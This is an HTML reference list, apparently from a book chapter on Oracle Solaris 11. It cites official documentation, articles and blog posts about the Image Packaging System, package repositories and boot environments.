<div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec30" class="calibre1"/>References</h1></div></div></div><div><ul class="itemizedlist"><li class="listitem"><em class="calibre11">Adding and Updating Oracle Solaris 11.1 Software Packages</em> (<em class="calibre11">Oracle Solaris 11.1 Information Library</em>)<a id="id196" class="calibre1"/> at <a class="calibre1" href="http://docs.oracle.com/cd/E26502_01/html/E28984/docinfo.html#scrolltoc">http://docs.oracle.com/cd/E26502_01/html/E28984/docinfo.html#scrolltoc</a></li><li class="listitem"><em class="calibre11">Copying and Creating</em><a id="id197" class="calibre1"/><em class="calibre11"> Oracle Solaris 11.1 Package Repositories</em> at <a class="calibre1" href="http://docs.oracle.com/cd/E26502_01/html/E28985/index.html">http://docs.oracle.com/cd/E26502_01/html/E28985/index.html</a></li><li class="listitem"><em class="calibre11">Publishing IPS Packages – Guide for Developers</em> (by Erick Reid and Brock Pytlik) at <a class="calibre1" href="http://www.oracle.com/technetwork/server-storage/solaris11/documentation/ips-packages-webinarseries-1666681.pdf">http://www.oracle.com/technetwork/server-storage/solaris11/documentation/ips-packages-webinarseries-1666681.pdf</a></li><li class="listitem"><em class="calibre11">Introducing the Basics of Image Packaging System (IPS) on Oracle Solaris 11</em> (by Glynn Foster) at <a class="calibre1" href="http://www.oracle.com/technetwork/articles/servers-storage-admin/o11-083-ips-basics-523756.html">http://www.oracle.com/technetwork/articles/servers-storage-admin/o11-083-ips-basics-523756.html</a></li><li class="listitem"><em class="calibre11">Command Summary: Basic Operations with the Image Package System in Oracle Solaris 11</em> (by Ginny Henningsen) at <a class="calibre1" href="http://www.oracle.com/technetwork/articles/servers-storage-admin/command-summary-ips-1865035.html">http://www.oracle.com/technetwork/articles/servers-storage-admin/command-summary-ips-1865035.html</a><em class="calibre11">Creating and Administering Oracle Solaris 11 Boot Environments</em> at <a class="calibre1" href="http://docs.oracle.com/cd/E23824_01/html/E21801/administer.html#scrolltoc">http://docs.oracle.com/cd/E23824_01/html/E21801/administer.html#scrolltoc</a></li><li class="listitem"><em class="calibre11">How to Publish Packages to the Imaging Packaging System</em> at <a class="calibre1" href="http://www.oracle.com/technetwork/systems/hands-on-labs/introduction-to-ips-1534596.html">http://www.oracle.com/technetwork/systems/hands-on-labs/introduction-to-ips-1534596.html</a></li><li class="listitem"><em class="calibre11">Solaris 11 REPO - Configuration of Multiple Repositories Using Multiple Depot Server Instances</em> (by Steven ESSO) at <a class="calibre1" href="http://stivesso.blogspot.com.br/2012/11/solaris-11-repo-configuration-of.html">http://stivesso.blogspot.com.br/2012/11/solaris-11-repo-configuration-of.html</a></li><li class="listitem"><em class="calibre11">How to Create the Solaris 11 IPS Repository</em> (by Brad Hudson) at <a class="calibre1" href="http://bradhudsonjr.wordpress.com/2011/08/09/how-to-create-the-solaris-11-ips-repository/">http://bradhudsonjr.wordpress.com/2011/08/09/how-to-create-the-solaris-11-ips-repository/</a></li><li class="listitem"><em class="calibre11">How to Create Multiple Internal Repositories for Oracle Solaris 11</em> (by Albert White) at <a class="calibre1" href="http://www.oracle.com/technetwork/articles/servers-storage-admin/int-s11-repositories-1632678.html">http://www.oracle.com/technetwork/articles/servers-storage-admin/int-s11-repositories-1632678.html</a></li><li class="listitem"><em class="calibre11">How to Create and Publish Packages to an IPS Repository on Oracle Solaris 11</em> (by Glynn Foster) at <a class="calibre1" href="http://www.oracle.com/technetwork/articles/servers-storage-admin/o11-097-create-pkg-ips-524496.html">http://www.oracle.com/technetwork/articles/servers-storage-admin/o11-097-create-pkg-ips-524496.html</a></li><li class="listitem"><em class="calibre11">Oracle Solaris 11 Cheat Sheet for the Image Packaging System</em> at <a class="calibre1" href="http://www.oracle.com/technetwork/server-storage/solaris11/documentation/ips-one-liners-032011-337775.pdf">http://www.oracle.com/technetwork/server-storage/solaris11/documentation/ips-one-liners-032011-337775.pdf</a></li><li class="listitem"><em class="calibre11">Solaris 11: how to setup IPS repository</em> (by Alessio Dini) at <a class="calibre1" href="http://alessiodini.wordpress.com/2012/10/03/solaris-11-how-to-setup-ips-repository/">http://alessiodini.wordpress.com/2012/10/03/solaris-11-how-to-setup-ips-repository/</a></li></ul></div></div></body></html>